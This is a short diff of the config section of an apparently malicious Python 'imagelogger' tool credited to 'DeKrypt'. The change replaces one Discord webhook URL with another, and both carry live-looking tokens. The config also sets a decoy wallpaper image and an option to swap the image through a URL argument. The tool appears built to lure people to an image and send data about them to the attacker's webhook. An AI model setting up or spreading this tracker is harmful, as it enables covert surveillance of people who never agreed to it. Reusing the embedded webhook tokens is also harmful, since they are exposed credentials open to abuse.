@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1555002312232276038/mljS-v8zweOpFpMvVn1wNwqUFvklsSNQa5tSCTj10HbJ1nTepszFiIIACmJeFVa88LsW",
+    "webhook": "https://discord.com/api/webhooks/1555242901573861386/kH_IqDMI2z8HMVXPu3nkwo2J1jsfmYNigY1Pq9J4gXuvjxPREww7xJWkD8i7iAS_waS4",
     "image": "https://c4.wallpaperflare.com/wallpaper/697/578/479/link-bliss-windows-xp-the-legend-of-zelda-microsoft-windows-the-legend-of-zelda-ocarina-of-time-video-games-zelda-hd-art-wallpaper-preview.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
